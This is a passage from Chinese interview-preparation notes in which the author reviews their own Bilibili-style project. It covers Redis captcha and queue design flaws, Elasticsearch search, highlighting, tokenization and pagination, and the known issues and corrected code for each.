  - **③ 局限**：Redis 单实例无持久化保障（我这份配置里没开 AOF/RDB 相关设置），宕机时**验证码全部失效、ES 增量消息全部丢失**。生产应该开 AOF（`appendonly yes`）+ 哨兵/集群。

**Q2 [进阶] 验证码为什么用 Redis？有哪些设计问题？**

- **答**：
  - **为什么**：① 有 TTL 语义；② 多实例共享；③ 内存存储，读写 < 1ms。
  - **项目里的设计问题**（主动列出）：
    1. **🔴 没有 TTL**：`redisTemplate.opsForValue().set(sessionId, code.toString())` —— 用的是 `set` 而不是 `set(key, value, timeout, TimeUnit)`。结果：验证码**永不过期**，用户可以拿三天前的验证码登录，而且 Redis 里垃圾数据无限增长。正确做法：`set(key, code, 5, TimeUnit.MINUTES)`。
    2. **🟠 验证码校验后可重复使用**：`LoginServiceImpl:80` 校验成功后**没有删除 key**，同一个验证码可以无限次登录（暴力破解时可以固定用一次拿到的验证码）。正确做法：校验成功后立即 `delete(key)`，或者用 `getAndDelete` 保证一次性。
    3. **🟠 手机验证码是 6 位纯数字但可爆破**：`sendPhoneNumberCaptcha` 生成 6 位数字，但没有「同一手机号 60 秒内只能发一次」+「同一 IP 每小时最多 N 次」+「验证码错误 3 次锁定」的防护，6 位数字（100 万种）在无限次尝试下完全可以爆破。正确做法：错误计数 + 锁定。
    4. **🟠 图形验证码把答案返回给前端了**：`getCaptcha` 的返回体里同时含 `CAPTCHA_IMAGE`（图片 base64）**和** `CAPTCHA_CODE`（明文答案）：
       ```java
       captchaMap.put(CAPTCHA_IMAGE, captcha);
       captchaMap.put(CAPTCHA_CODE, code.toString());   // ← 答案直接给前端
       ```
       这就是**图形验证码完全失效**——用户（或脚本）直接从响应里读答案就行，根本不用 OCR。正确做法是只返回图片 + sessionId，答案只存 Redis。
    5. **🟠 用手机号/邮箱当 key 会泄露隐私**：Redis 里能直接看到所有用户手机号。应改成 `sms:captcha:{hash(phone)}` 这种加盐哈希。
  
  - **这四条合起来其实说明一件事**：验证码这套东西我实现了"功能"，但没有做"安全设计"。这也是我复盘时列的「安全基线」必改项。

**Q3 [深挖] 那个 `encode-count` 令牌，代码有什么问题？**

- **考点**：**这题是 Redis 章节的分水岭**。面试官只要看到 `edit()` 里那段就知道有问题。

- **答**（贴代码逐条拆）：
  ```java
  CompletableFuture<Void> future1 = CompletableFuture.runAsync(() -> {
      while (true) {
          String key = "encode-count";
          Integer count = (Integer) objectRedisTemplate.opsForValue().get(key);
          if (count < 3) {                          // ← ①
              client.sendUploadNotice(...);
              count++;
              objectRedisTemplate.opsForValue().set(key, count);   // ← ② ③
              break;
          } else {
              Thread.sleep(5000);                   // ← ④
          }
      }
  });
  ```
  1. **🔴 NPE**：key 不存在时 `get()` 返回 `null`，`count < 3` 会**拆箱 NPE**。也就是说**第一次调用这个接口必然抛异常**（除非之前有人手动 set 过）。而且这个异常在 `CompletableFuture.runAsync` 里被吞掉（异常进 `CompletableFuture` 的异常状态，没人 `join()` 也没人处理），表现为「静默失败」——转码消息根本没发出去。
  2. **🔴 自增逻辑错了**：`count++` 之后 `set`，但**下一个人进来还是会读到旧值**（read-modify-write 不是原子的）。同一时刻多个请求都会通过 `count < 3` 判断，令牌失效。正确做法：`Long n = redis.opsForValue().increment(key); if (n > 3) { /* 拒绝 */ }`，`INCR` 是原子的。
  3. **🔴 计数器永不递减、永不过期**：`count` 只增不减，一旦到 3 就**永久卡死**——后续所有视频都再也发不出转码消息（除非重启 Redis）。正确做法是「**信号量语义**」：取令牌时 `INCR`，转码完成后 `DECR`（在 MQ 消费端做），并给 key 设过期兜底。
  4. **🔴 忙等死循环**：`else` 分支 `Thread.sleep(5000)` 后重新读，**没有跳出条件、没有超时**。如果此时已有 3 个转码在跑且它们永远不会释放（因为根本没有释放逻辑），这个 `CompletableFuture` 线程会**永远循环**，占用线程池线程。这是明确的生产事故隐患。
  5. **🟠 用 `CompletableFuture.runAsync` 用默认线程池**：`ForkJoinPool.commonPool()`，并行度 = CPU 核数 - 1。在上面那种死循环场景下，几个这样的任务就能把 commonPool 占满，**拖垮整个 JVM 的其他并行流操作**。应该用显式配置的 `ThreadPoolTaskExecutor`。
  
  - **重构方案**（说这个能体现工程能力）：
    ```java
    // 获取令牌：Lua 脚本保证「检查+占用」原子，并给 key 设过期防止死锁
    private static final String ACQUIRE = 
        "local c = tonumber(redis.call('get', KEYS[1]) or '0') " +
        "if c < tonumber(ARGV[1]) then redis.call('incr', KEYS[1]); " +
        "redis.call('expire', KEYS[1], ARGV[2]); return 1 else return 0 end";
    // 释放令牌：转码消费者在 finally 里 DECR
    ```
    更好的方案是直接引入 **Sentinel 的 `Semaphore`/`FlowRule`** 或 **Redisson 的 `RSemaphore`**，不要手写。

**Q4 [深挖] Redis 在 ES 同步链路里当队列，有什么风险？**

- **考点**：**这题非常能区分"用过"和"想过"**。

- **答**：链路是 `MQ → MysqlToEsConsumer.rightPush(Redis List) → xxl-job 定时 range + delete`。风险有五个：

  1. **🔴 `range` + `delete` 不是原子操作，有消息丢失窗口**：
     ```java
     List<HashMap<String,Object>> videoAddList = redis.opsForList().range(VIDEO_ADD_KEY, 0, -1);
     // ... 处理并 bulk 写 ES ...
     objectRedisTemplate.delete(VIDEO_ADD_KEY);
     ```
     在这两步之间，如果 notice 又 `rightPush` 了新消息，**这条新消息会被 `delete` 一起删掉，但从未写入 ES** → 数据永久不一致。
     
     **正确做法**（三种，按代价排序）：
     - **用 `LPOP`/`RPOPLPUSH` 逐条消费**：`RPOPLPUSH queue processing` 把消息原子地移到「处理中队列」，处理成功后再 `LREM` 删除；失败则留在 processing 里由补偿任务处理。这是 Redis 做可靠队列的标准姿势。
     - **用 Lua 脚本原子地「取走并清空」**：`local v = redis.call('lrange', KEYS[1], 0, -1); redis.call('del', KEYS[1]); return v`，一次 RTT 完成，窗口为零。
     - **直接让 search 也订阅 MQ**：用 RocketMQ 的消费位点管理来保证 at-least-once，然后**把 ES 写入做成幂等**（`docAsUpsert`，我代码里已经用了！）。这其实是最正确的方案——**我已经有了幂等保证，就不需要 Redis 这层缓冲了**。

  2. **🟠 List 无 TTL、无 MAXLEN**：如果 search 服务挂了三天，Redis List 会无限增长直到**打爆内存**（Redis 的 List 是内存结构）。应该 `LTRIM` 保留最近 N 条，或至少告警。
  3. **🟠 notice 和 search 共享同一份 key 定义但代码里是两份 `Constant`**：`notice/constant/Constant.java` 和 `search/constant/Constant.java` **各写了一遍** `add:video`、`update:video` 等字符串常量。一旦有人改了一边，**链路静默断裂**（notice 往 `add:video` 写，search 从 `add:video:v2` 读）。应该抽到 `common` 统一维护——这是个低成本的解耦改进。
  4. **🟠 失败重试 10 次后仍返回 true**：`bulkOpreateUntilAllSucess(bulkRequest, list, 10)` 递归重试，但 `maxRetry` 耗尽后**直接 `return true`**，调用方（xxl-job 任务）以为成功了。而 List 已经被 `delete` 了，**失败的文档永远不会再同步**。应该返回失败、抛异常让 xxl-job 记 `handle_code=500` 并触发告警。
  5. **🟡 用 List 而不是 Stream**：Redis 5.0+ 的 **Stream 类型**（`XADD`/`XREADGROUP`/`XACK`）是**为消息队列设计的**——自带消费组、ACK 机制、消息 ID、pending 列表。用 List 模拟队列等于自己重新实现一遍 Stream 的功能，而且实现得不完整。

**Q5 [必答] 你项目里 Redis 的 key 是怎么设计的？**

- **答**（**诚实答案 + 正确规范**）：
  - **现状**（说实话）：设计很粗糙，就是**业务名直接用**：`sessionId`（一个 UUID）、手机号、`encode-count`、`add:video`。没有统一前缀、没有环境隔离、没有类型标识。
  - **问题**：① 多个服务共用一个 Redis 实例时**无法从 key 看出归属**，`FLUSHDB` 或误删无法评估影响；② 本地/测试/生产如果共库会互相污染；③ 手机号这种敏感数据明文当 key。
  - **正确规范**（要能背出来）：
    ```
    {业务}:{模块}:{对象}:{标识}
    例：bili:auth:captcha:sms:{md5(phone)}
        bili:search:sync:video:add
        bili:video:encode:semaphore
        bili:user:profile:{userId}
    ```
    - **必须分隔符统一**（冒号）；**必须有业务前缀**（便于 `SCAN bili:search:*` 排查和多租户隔离）；**必须设 TTL**（除队列类）；**敏感值做哈希**；**大 key 拆小**（用 Hash 代替捆在一起的大 String）。
  - **加分句**：**生产环境不要用 `KEYS *`**（O(N) 阻塞单线程），要用 `SCAN` 游标分批；`FLUSHALL` 应该在生产禁掉（`rename-command FLUSHALL ""`）。

**Q6 [进阶] 缓存穿透、击穿、雪崩怎么解决？**

- **考点**：**标准八股，而且面试官一定会问**——即使我项目里没做缓存，也要答得出来，否则显得基础不牢。

- **答**（先明确前提，再讲方案）：
  - **前提说明**（诚实）：「我项目里 Redis 主要当共享状态和队列用，**没有做业务缓存**，所以这三个问题在我项目里目前不存在。但我清楚这三类问题的成因和解法。」
  - **缓存穿透**：查询**不存在的数据**，缓存永远不命中，请求全打到 DB。
    - 解法：① **缓存空值**（`set key "" EX 60`），简单但要注意 key 数膨胀；② **布隆过滤器**预判存在性（项目里 `MysqlToEsHandler` 曾经用过这个思路，后来被我删掉了——见第 8 章）；③ 参数校验前置（id ≤ 0 直接返回）。
  - **缓存击穿**：**某个热点 key 过期瞬间**，大量并发请求同时打到 DB。
    - 解法：① **互斥锁**（`SETNX` 抢锁，只有拿到锁的线程去查 DB 并回填，其余等待）；② **逻辑过期**（value 里存过期时间，业务判断"逻辑过期"后异步刷新，不阻塞读）；③ 热点 key **永不过期** + 后台定时刷新。
  - **缓存雪崩**：**大批 key 同时过期**或 Redis 整体宕机。
    - 解法：① TTL **加随机抖动**（`base + random(0, 300)` 秒），避免同一时刻集体失效；② **多级缓存**（本地 Caffeine + Redis）；③ Redis **高可用**（哨兵/集群）；④ **熔断降级**（Redis 挂了直接查 DB 并限流保护 DB）。

**Q7 [进阶] Redis 为什么快？单线程模型了解吗？**

- **答**：
  1. **纯内存操作**：没有磁盘 I/O（RDB/AOF 是异步的）。
  2. **单线程避免锁竞争和上下文切换**：命令执行是串行的，所以 `INCR`、`SETNX`、Lua 脚本天然原子——**这一点正是我项目里敢用 `encode-count` 做计数器的理论依据**（虽然我实现错了）。
  3. **I/O 多路复用**（epoll）：单线程能同时处理成千上万连接。
  4. **高效数据结构**：SDS（简单动态字符串）、跳表（ZSet）、压缩列表（listpack/ziplist）、渐进式 rehash。
  5. **Redis 6.0 起引入多线程**，但**只用于网络 I/O 的读写解析**，命令执行仍然是单线程——所以「单线程」这个说法在 6.0+ 严格说应该是「命令执行单线程」。**我项目里用的是 SpringBoot 2.6 自带的 Lettuce 客户端（默认），Lettuce 基于 Netty 是异步的，连接是共享的**，不会因为并发高就创建大量连接。

**Q8 [进阶] 大 key / 热 key 问题怎么发现和解决？**

- **答**：
  - **大 key**（单个 value 过大，如一个 List 存了几十万条）：
    - **危害**：`GET`/`DEL` 时阻塞单线程；网络传输大；集群下容易数据倾斜。
    - **发现**：`redis-cli --bigkeys`、`MEMORY USAGE key`、`SCAN` + `STRLEN`/`LLEN` 采样。
    - **解决**：拆分（大 List 切成 `key:0`、`key:1`）、改用 Hash 分字段、删除用 `UNLINK`（异步删除，不阻塞）。
    - **项目实证**：`add:video` 这个 List 就是潜在大 key——无 MAXLEN，search 挂了就无限增长。
  - **热 key**（某个 key 被超高并发访问）：
    - **危害**：单分片成为瓶颈。
    - **发现**：`redis-cli --hotkeys`（需要 `maxmemory-policy` 为 LFU）、客户端埋点统计。
    - **解决**：**本地缓存**（Caffeine）+ 短暂 TTL、key 加随机后缀打散到多个分片（代价是读取时要聚合）、读写分离。

### 6.3 主动暴露的坑

| 问题 | 位置 | 严重度 | 正确做法 |
|---|---|---|---|
| 验证码无 TTL | `LoginServiceImpl:201,215,228` | 🟠 高 | `set(k,v,5,MINUTES)` |
| **图形验证码答案随响应返回前端** | `LoginServiceImpl:197` | 🔴 致命 | 只返回图片 + sessionId |
| 验证码校验后不删除 | `LoginServiceImpl:74,94,130` | 🟠 高 | 校验后 `delete` |
| **`encode-count` NPE + 不释放 + 死循环** | `UploadAndEditServiceImpl:189-207` | 🔴 致命 | Lua 原子信号量 / Redisson |
| **`range`+`delete` 非原子，丢消息** | `MysqlToEsHandler:62-103` | 🔴 致命 | `RPOPLPUSH` 或 Lua 原子取空 |
| Redis List 无 TTL / 无 MAXLEN | `MysqlToEsConsumer:54-80` | 🟠 高 | `LTRIM` + 告警 |
| key 无统一前缀、敏感值当 key | Redis 全局 | 🟡 中 | `业务:模块:对象:标识` 规范 |
| `@type` 污染 ES 文档 | `MysqlToEsHandler:185` | 🟡 中 | 手动 remove（已修）/ 换 Jackson 序列化 |
| 无缓存穿透/击穿/雪崩防护 | 全项目无业务缓存 | 🟡 中 | 见 Q6 |

---

## 第 7 章 Elasticsearch —— 更快的查询与更高的查询匹配度

### 7.1 在这个项目里它扮演什么角色

**一句话**：ES 是**搜索与推荐的引擎**。MySQL 负责事务性写入，ES 负责「**模糊匹配 + 相关度排序 + 多字段聚合搜索**」。项目里有 3 个索引：

| 索引 | 文档内容 | 关键字段 |
|---|---|---|
| `video` | 视频（含作者名、播放量、弹幕量） | `video_name`、`author_name`、`intro`、`play_count`、`danmaku_count`、`collect_count`、`create_time` |
| `user` | 用户 | `nickname`、`intro`、`fans_count`、`video_count` |
| `history_search` | 用户搜过的历史关键词（用于补全） | `search_word` |

**技术选型落点**

| 落点 | 源码 | 说明 |
|---|---|---|
| 版本 | `java/pom.xml:36-39` | **7.13.3**（client 和 server 严格同版本） |
| 客户端 | `search/config/ElasticsearchClientConfig.java` | **手写 `RestHighLevelClient`**（不是 Spring Data ES） |
| 连接参数 | 同上 `:48-57` | `ioThreadCount=8`、connect/socket 超时均 300s |
| 启动阻塞探测 | 同上 `:60-73` | `while(true) ping → sleep(10)` |
| 聚合搜索 | `SearchServiceImpl.totalKeywordSearch` | 两条 SearchRequest 串行（video + user） |
| 多字段匹配 | `SearchServiceImpl:74` | `multiMatchQuery(keyword, video_name, author_name, intro).type(MOST_FIELDS)` |
| 相关度阈值 | `SearchServiceImpl:61-62,76` | `minScore` 可配（默认 1.0） |
| 排序 | `SearchServiceImpl:125-135` | 相关度 / 播放量 / 创建时间 / 弹幕量 / 收藏量 |
| 推荐 | `SearchServiceImpl:229-234` | **`moreLikeThisQuery`** (`minTermFreq(1)`, `maxQueryTerms(12)`) |
| 补全 | `SearchServiceImpl:204-216` | 对历史搜索索引再跑一次 `multiMatch` |

### 7.2 高频问答

**Q1 [必答] 为什么用 Elasticsearch？MySQL 的 LIKE 不行吗？**

- **答**（三段）：
  - **① 解决什么**：搜索有三个需求是 MySQL `LIKE` 做不到的：**① 多字段聚合搜索**（视频名 + 作者名 + 简介一起搜）；**② 相关度排序**（"张三"要能匹配到作者名为张三的视频，并且排在只提到张三的简介前面）；**③ 中文分词**（"程序员的一天"用 `LIKE '%程序员%'` 只能前缀/包含匹配，而分词后"程序"、"员"、"一天"都能命中）。另外我的 `video` 表和 `user` 表在**不同服务**里（video 模块和 user_center 模块），用 MySQL 搜跨库 join 要跨服务调用，而 ES 里是**一个索引里就有作者名**（同步时 join 好了），查询成本极低。
  - **② 为什么不用别的**：`LIKE '%x%'` 无法走索引 → **全表扫描**，`video` 表数据量一大就是灾难。可以用 MySQL 全文索引（`FULLTEXT` + `ngram` 分词器），但只支持 InnoDB 且功能弱（没有相关性评分调优、没有高亮、没有 suggest、没有聚合分析）。Solr 功能相近但运维更重、社区活跃度不如 ES。
  - **③ 代价**：ES **没有事务**，所以必须解决「MySQL 和 ES 数据一致性」问题——这是我项目里最复杂的一段链路（见第 9 章 RocketMQ、第 20 章 XXL-Job）。

**Q2 [必答] ES 的核心概念和 MySQL 怎么对应？**

- **答**：

  | MySQL | Elasticsearch | 说明 |
  |---|---|---|
  | Database | **Index**（索引） | 项目里：`video`、`user`、`history_search` |
  | Table | ~~Type~~（7.x 已废弃） | 7.0 起一个索引只能有一个 type，所以 index ≈ table |
  | Row | **Document**（文档） | JSON 格式 |
  | Column | **Field**（字段） | 有 `text` / `keyword` / `long` / `date` 等类型 |
  | Schema | **Mapping** | 显式定义或 dynamic mapping |
  | SQL | **DSL**（Query DSL） | `multi_match`、`bool`、`term` 等 |
  | 索引（B+树） | **倒排索引**（Inverted Index） | 词 → 文档 id 列表 |
  | — | **分片 / 副本**（Shard / Replica） | 水平扩展与高可用 |

  - **关键区别（必须说到）**：
    - `text` 类型会**分词**，用于全文检索；`keyword` 类型**不分词**，用于精确匹配、排序、聚合。**我项目里用 `dynamic mapping` 自动建索引，字段类型是 ES 猜的**——这就是为什么 `hit.getSourceAsMap().get("id")` 要强转 `String`（`SearchServiceImpl:181`），说明 `id` 被猜成了 keyword/text 而不是数值类型。**生产必须显式定义 mapping。**
    - ES 是**近实时**（NRT）：写入后默认 **1 秒**（`refresh_interval`）才能被搜到，所以搜索有「刚投稿搜不到」的天然延迟窗口。

**Q3 [必答] 你的聚合搜索是怎么实现的？把 query 讲一下。**

- **答**（对着代码讲，这是最能体现"真做过"的部分）：
  ```java
  // SearchServiceImpl:74-79  视频搜索
  videoSearchSourceBuilder.query(
      QueryBuilders.multiMatchQuery(keyword, "video_name", "author_name", "intro")
              .type(MultiMatchQueryBuilder.Type.MOST_FIELDS));
  videoSearchSourceBuilder.minScore(minScore);
  videoSearchSourceBuilder.sort("_score", SortOrder.DESC);
  ```
  
  - **`multi_match` 的作用**：一个关键词同时在 3 个字段上匹配，命中任意字段都算匹配。
  - **`type(MOST_FIELDS)` 的含义**（**这是踩过坑的点**）：`multi_match` 有多种打分策略：
    | type | 打分方式 | 适用 |
    |---|---|---|
    | `best_fields`（默认） | **取匹配最好的单个字段**的分数 | 「找一个词最像的字段」，如人名搜索 |
    | `most_fields` | **把所有匹配字段的分数相加** | 「越多字段命中越好」，如文章搜索 |
    | `cross_fields` | 把多字段当成一个大字段 | 「词分散在不同字段」，如"张 三" |
    | `phrase` / `phrase_prefix` | 短语匹配 | 精确短语 |
    
    我选 `MOST_FIELDS` 是因为**视频搜索希望「作者名也命中」能被加权**——比如搜「张三」，作者叫张三的视频、简介里提到张三的视频都该出来，且前者应该更靠前（因为 `best_fields` 反而会丢掉多字段命中的加成）。**但严格说，更合适的是给字段加 `boost`**：`multiMatchQuery(kw, "video_name^3", "author_name^2", "intro")` —— 标题权重最高。这是我下一步要改的。
  - **`minScore` 的作用与坑**：过滤掉相关度过低的结果。**这里我踩过一个真坑**：原来写死 `minScore(1.0f)`，但 ES 的 BM25 分数量级**取决于索引规模**——在只有几条文档的新实例上，一个完全匹配的中文标题可能只有 0.36 分，`> 1.0` 这个绝对阈值把**所有结果都滤掉了**（表现为搜索恒返回空）。我改成配置项 `${bilibili.search.min-score:1.0}`，小数据集覆盖成 0.1。
    - **这题的加分答法**：`minScore` 用**绝对阈值**本身就是设计缺陷，因为 BM25 分数**不可跨索引、不可跨数据量比较**。正确做法是：① 用**相对阈值**（取 top hit 分数的百分比）；② 或干脆不用 minScore，靠 `function_score` 和 boost 调优；③ 或者用 `track_scores=false` + `_score` 排序 + 前端过滤。
  - **两个索引串行查询**：`totalKeywordSearch` 里先查 video 再查 user，**两次网络往返串行**。可以用 **`MultiSearchRequest`（msearch）** 一次请求批量查两个索引，把两次 RTT 合成一次。这是个容易实现的优化点。
  - **分页**：`size(20)` 硬编码 + `from((pageNumber-1)*size)`。

**Q4 [进阶] 你的关键字补全怎么实现的？为什么不用 completion suggester？**

- **考点**：**这题很能看出是否了解 ES 的真正能力**。

- **答**：
  - **我的实现**：在 `history_search` 索引里存用户**搜过的关键词**，用户输入时对该索引跑一次 `multiMatchQuery(searchWord, "search_word")`，返回匹配的历史词列表。
    ```java
    // SearchServiceImpl:204-216
    sourceBuilder.query(QueryBuilders.multiMatchQuery(searchWord, MULTI_QUERY_SEARCH_WORD));
    ```
  - **这个实现的定位**：它其实是「**搜索历史联想**」，不是「**内容补全**」。B 站那种「输入 b 就提示 bilibili」的效果，我这个方案给不出来（因为历史词里没有 "bilibili" 这个记录就提示不了）。
  - **ES 的正规方案：`completion suggester`**（我这题最该展示的知识）：
    ```json
    PUT /video
    { "mappings": { "properties": {
        "suggest": { "type": "completion", "analyzer": "ik_smart" } } } }
    
    POST /video/_search
    { "suggest": { "my_suggest": {
        "prefix": "程序", "completion": { "field": "suggest", "size": 5, "skip_duplicates": true } } } }
    ```
    - **原理**：completion 类型会构建 **FST（有限状态转换器）**，把词前缀索引起来，**前缀查找是 O(前缀长度)**，比倒排索引查询快一个量级，专门为「输入即提示」设计。
    - **代价**：FST 常驻内存（`max_memory` 需配置），只支持前缀匹配（不支持中间的模糊匹配），写入比普通字段慢。
  - **另一条路：`edge_ngram` 分词器**（如果要用普通 `match` 做前缀搜索）：
    ```json
    "analyzer": { "my_edge": { "tokenizer": "my_edge_tokenizer" } },
    "tokenizer": { "my_edge_tokenizer": { "type": "edge_ngram", "min_gram": 1, "max_gram": 20 } }
    ```
    - 索引时 `bilibili` 会被切成 `b`、`bi`、`bil`...`bilibili`，搜索时用 `standard` 分词器查 `b` 就能命中。**代价是索引膨胀**（每个词产生 N 个 token）。
  - **诚实收尾**：我目前是「历史词 multiMatch」，属于能用但不够好；要真正做补全，应该给 `video_name`/`nickname` 加 completion 字段，写入时同步。**另外前端的高亮是 js 做的（`vue/src/static/highlight.js`），不是 ES 高亮**——见 Q5。

**Q5 [深挖] 你说做了高亮，但代码里 ES 的高亮没实现？**

- **考点**：**这是最容易被拆穿的一题**，必须老实回答。

- **答**：
  - **事实**：`SearchServiceImpl.java:32` **只 import 了 `HighlightBuilder`，但全文没有任何一处使用它**。真正的高亮在前端：`vue/src/static/highlight.js` 用正则把关键词包成 `<span class="highlight">`。
  - **为什么我当时这么做**（诚实）：前端渲染搜索结果时要展示「视频名 + 作者名 + 简介」三段，用前端 JS 统一处理只要写一次；而用 ES 高亮要在每个 `SearchHit` 上取 `getHighlightFields()`，还要处理 `pre_tags`/`post_tags` 和 XSS 转义，当时觉得麻烦就放前端了。
  - **为什么这不对**（要能讲清代价）：
    1. **XSS 风险**：前端用正则替换并 `v-html` 渲染，如果视频标题里含 `<script>`，会产生 **XSS 漏洞**（除非做了转义，我这份实现没有）。ES 高亮也需要注意 `<em>` 标签的注入问题，但至少是受控的。
    2. **与分词不一致**：ES 用 IK 分词后命中的可能是「程序」这种子词，前端正则拿整个关键词去匹配会**对不上**，出现「搜到了但没高亮」。
    3. **性能**：前端要对每条结果做多次正则替换，长列表下比 ES 侧返回高亮片段要慢。
  - **正确实现**：
    ```java
    HighlightBuilder hb = new HighlightBuilder()
        .field("video_name").field("author_name").field("intro")
        .preTags("<em class='hl'>").postTags("</em>")
        .fragmentSize(100).numberOfFragments(1);
    sourceBuilder.highlighter(hb);
    // 取结果
    for (SearchHit hit : response.getHits()) {
        Map<String, HighlightField> hf = hit.getHighlightFields();
        if (hf.containsKey("video_name")) {
            resp.setVideoName(hf.get("video_name").getFragments()[0].string());
        }
    }
    ```

**Q6 [进阶] 你的中文分词是怎么配的？**

- **答**（**必须诚实，并且要讲清正确做法**）：
  - **现状**：**没有配任何分词器**。docker 里用的是官方的 `elasticsearch:7.13.3` 镜像（`docker/docker-compose.yml:338`），**没有装 IK 插件**，索引也是靠 `dynamic mapping` 自动建的，没有 mapping 资源文件。所以中文实际上是被 **standard 分词器按字切分**的（"程序员" → "程"、"序"、"员"），匹配效果差、相关度算不准。
  - **为什么会这样**：作者本地/线上环境可能装了插件但没进仓库，**属于环境依赖没有固化——这是一个严重的可复现性问题**（面试官问「你怎么保证本地能跑起来」时这是减分项）。
  - **正确做法**：
    1. **Dockerfile 自定义镜像装 IK**：
       ```dockerfile
       FROM elasticsearch:7.13.3
       RUN ./bin/elasticsearch-plugin install --batch \
           https://github.com/medcl/elasticsearch-analysis-ik/releases/download/v7.13.3/elasticsearch-analysis-ik-7.13.3.zip
       ```
       **版本必须和 ES 严格一致**，差一个小版本插件就会加载失败。
    2. **显式定义 mapping**：
       ```json
       PUT /video
       { "settings": { "analysis": { "analyzer": {
             "ik_index": { "type": "custom", "tokenizer": "ik_max_word" } } } },
         "mappings": { "properties": {
             "video_name":  { "type": "text", "analyzer": "ik_max_word", "search_analyzer": "ik_smart" },
             "author_name": { "type": "text", "analyzer": "ik_max_word" },
             "author_id":   { "type": "integer" },
             "play_count":  { "type": "integer" },
             "create_time": { "type": "date" } } } }
       ```
    3. **`ik_max_word` vs `ik_smart`**（**必答细节**）：
       - `ik_max_word`：**最细粒度**切分，「中华人民共和国」→「中华人民共和国 / 中华人民 / 中华 / 华人 / 人民共和国 / 人民 / 共和国 / 共和 / 国」。**索引时用**，召回率高。
       - `ik_smart`：**粗粒度**切分，「中华人民共和国」→「中华人民共和国」。**搜索时用**，准确率高。
       - **最佳实践就是「索引用 max_word，搜索用 smart」**——最大化召回 + 保证精度。上面 mapping 就是这个配法。
    4. **自定义词典**：`IKAnalyzer.cfg.xml` 里挂 `ext_dict`，把 "UP主"、"三连"、"弹幕"、"B站" 这类领域词加进去，否则会被切错。

**Q7 [深挖] 你的分页有什么问题？**

- **答**：
  - **现状**：`searchSourceBuilder.from((pageNumber-1)*size).size(20)`，典型的 `from + size` 分页。
  - **三个问题**：
    1. **🔴 深分页性能**：`from + size` 的机制是「**每个分片都要取出 from+size 条，协调节点归并后再丢弃前 from 条**」。所以 `from=10000, size=20` 时，每个分片要取 10020 条，5 个分片就是 5 万条，**协调节点内存和网络开销随页码线性增长**。
    2. **🔴 结果数上限 10000**：ES 默认 `index.max_result_window = 10000`，`from + size > 10000` 直接报错：
       ```
       Result window is too large, from + size must be less than or equal to: [10000]
       ```
       而我的 `totalKeywordSearch` 用 `getTotalHits().value` 算总页数，**默认 `track_total_hits` 在 7.x 里上限也是 10000**——也就是说**超过 1 万条的结果，总页数会算错**（永远显示 ≤ 500 页）。要做精确总数必须加 `trackTotalHits(true)`（代价是性能）。
    3. **🟠 `size` 硬编码 20**：应该做成参数，且要**限制上限**（比如 `size ≤ 100`），否则 `size=100000` 一个请求就能打爆 ES。
  - **正确方案**：
    | 场景 | 方案 |
    |---|---|
    | 前几页（< 1 万条） | `from + size` 够用，但要 `trackTotalHits` 按需开 |
    | **深分页（无限滚动）** | **`search_after`**：用上一页最后一条的排序值作为下一页的游标。**无 from 开销、无 10000 限制**，是官方推荐方案。代价是**不能跳页**（只能顺序翻）。 |
    | 只需要总数不要全量 | `size=0` + `track_total_hits: true` |
    | 大量数据导出 | **`scroll`**（快照游标）或 **PIT + search_after**（7.10+ 推荐） |

**Q8 [深挖] 你的 ES 客户端配置有什么问题？**

- **答**：
  1. **🟠 超时 300 秒太长**：`setConnectTimeout(300000).setSocketTimeout(300000)`。连接超时 5 分钟意味着**ES 挂掉时请求会挂 5 分钟才失败**，Tomcat 线程在此期间全部被占住，会**级联拖垮整个 search 服务**。合理值应该是 connect 1-3 秒、socket 10-30 秒（搜索类接口）。
  2. **🟠 无认证配置**：`ElasticsearchClientProperties` 里有 `username`/`password` 字段，但 **`ElasticsearchClientConfig` 从未使用它们**——也就是说连的是**无认证的 ES**（`http://localhost:9200` 裸奔）。生产必须启用 X-Pack Security（HTTPS + 认证），否则任何人都能读写删索引。项目里那个 `POST /search/createIndex` 接口**没有任何鉴权**，可以直接把 `video` 索引删了重建——这属于严重的安全缺陷。
  3. **🟠 启动时 `while(true) ping` 阻塞**：ES 没起来服务就永远起不来，而且在容器编排里会导致**启动探针失败 → 反复重启 → 循环**。正确做法是「**启动不阻塞 + 健康检查 `HealthIndicator` 上报 + 手动降级**」（ES 挂了搜索走 MySQL 降级）。
  4. **🟡 无连接池上限配置**：只设了 `ioThreadCount=8`，没有设 `setMaxConnTotal` / `setMaxConnPerRoute`，高并发下可能创建过多连接。
  5. **🟡 版本混用**：`java/pom.xml` 里同时引了 `spring-boot-starter-data-elasticsearch:3.1.2`（这是 **SpringBoot 3.x 时代的版本**）和 `elasticsearch-rest-high-level-client:7.13.3`，而项目是 SpringBoot 2.6。**starter 3.1.2 一行代码都没用到**，纯粹是依赖污染，有引入冲突的风险，应该删掉。
  6. **🟡 `RestHighLevelClient` 在 ES 7.15 已废弃**，官方推荐 `Elasticsearch Java API Client`（8.x 的新客户端）。我这个项目用 7.13.3 还可以，但简历上如果写 ES 8 要能说出这个差异。

**Q9 [进阶] `more_like_this` 是怎么实现推荐视频的？**

- **答**：
  ```java
  // SearchServiceImpl:225-234
  Item[] items = { new Item("video", videoId) };
  sourceBuilder.query(QueryBuilders.moreLikeThisQuery(null, null, items)
          .minTermFreq(1).maxQueryTerms(12));
  sourceBuilder.sort("_score", SortOrder.DESC);
  ```
  - **原理**：`more_like_this`（MLT）**先从指定的文档里提取「有代表性的词项」**（按 TF-IDF 挑出权重高的词），然后**用这些词去构造一个 `should` 查询**，找与它词项重叠最多的其他文档。本质是**基于内容的相似度推荐**（content-based），不需要用户行为数据。
  - **参数含义**：
    - `minTermFreq(1)`：一个词在源文档里至少出现 1 次才纳入候选（低 → 召回多、噪声大）；
    - `maxQueryTerms(12)`：最多取 12 个词项构造查询（控制查询复杂度）；
    - 还有 `minDocFreq`（词至少出现在多少文档里，用来过滤生僻词）、`minWordLength`、`stopWords`。
  - **为什么要 `if (!recommendVideo.getVideoId().equals(videoId))` 过滤**：MLT 的结果**必然包含源文档自己**（它和自己 100% 相似），所以要剔除。我把过滤放在 **Java 侧**，其实更优雅的是在查询里加 `bool.must_not(termQuery("video_id", videoId))`——**这样能少传一条数据、而且不会因为过滤后结果不足 10 条而白拿**（如果 MLT 只返回 5 条且第一条是自己，过滤后只剩 4 条）。这是个可以主动提的优化点。
  - **局限**：MLT 是**纯内容相似**，没有协同过滤的「别人也看了」能力，冷启动还好但个性化弱。要做得更好应该上「**item-based CF + ES 向量检索（`dense_vector` + kNN）**」，把视频标题/简介做 embedding 存成向量，用 kNN 找最近邻。

### 7.3 主动暴露的坑

